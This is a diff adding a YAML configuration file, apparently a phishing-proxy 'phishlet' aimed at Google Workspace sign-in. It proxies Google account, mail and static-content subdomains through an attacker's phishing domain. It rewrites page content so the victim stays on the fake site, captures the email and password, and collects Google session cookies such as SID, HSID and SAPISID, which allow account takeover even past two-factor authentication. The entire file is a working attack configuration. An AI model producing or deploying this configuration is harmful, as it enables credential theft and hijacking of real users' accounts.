@@ -1,0 +1,69 @@
+name: "Google Workspace"
+author: "PhantomGate"
+min_ver: "1.0.0"
+
+proxy_hosts:
+  - phish_sub: "accounts"
+    orig_sub: "accounts.google.com"
+    domain: "google.com"
+    session: true
+    is_ssl: true
+  - phish_sub: "mail"
+    orig_sub: "mail.google.com"
+    domain: "google.com"
+    session: false
+    is_ssl: true
+  - phish_sub: "ssl"
+    orig_sub: "ssl.gstatic.com"
+    domain: "gstatic.com"
+    session: false
+    is_ssl: true
+
+sub_filters:
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: "accounts.google.com"
+    replace: "accounts.{phish_domain}"
+    mimes: ["text/html", "application/javascript", "application/json"]
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: "ssl.gstatic.com"
+    replace: "ssl.{phish_domain}"
+    mimes: ["text/html", "application/javascript"]
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: "mail.google.com"
+    replace: "mail.{phish_domain}"
+    mimes: ["text/html", "application/javascript", "application/json"]
+
+credentials:
+  username:
+    key: "Email"
+    search: '"identifier"\s*:\s*"([^"]*)"'
+    type: "json"
+  password:
+    key: "Passwd"
+    search: ""
+    type: "post"
+
+auth_tokens:
+  - domain: ".google.com"
+    keys:
+      - "SID"
+      - "HSID"
+      - "SSID"
+      - "APISID"
+      - "SAPISID"
+      - "OSID"
+      - "LSID"
+  - domain: "accounts.google.com"
+    keys:
+      - "GAPS"
+
+landing_path:
+  - "/ServiceLogin"
+  - "/signin"
+  - "/"
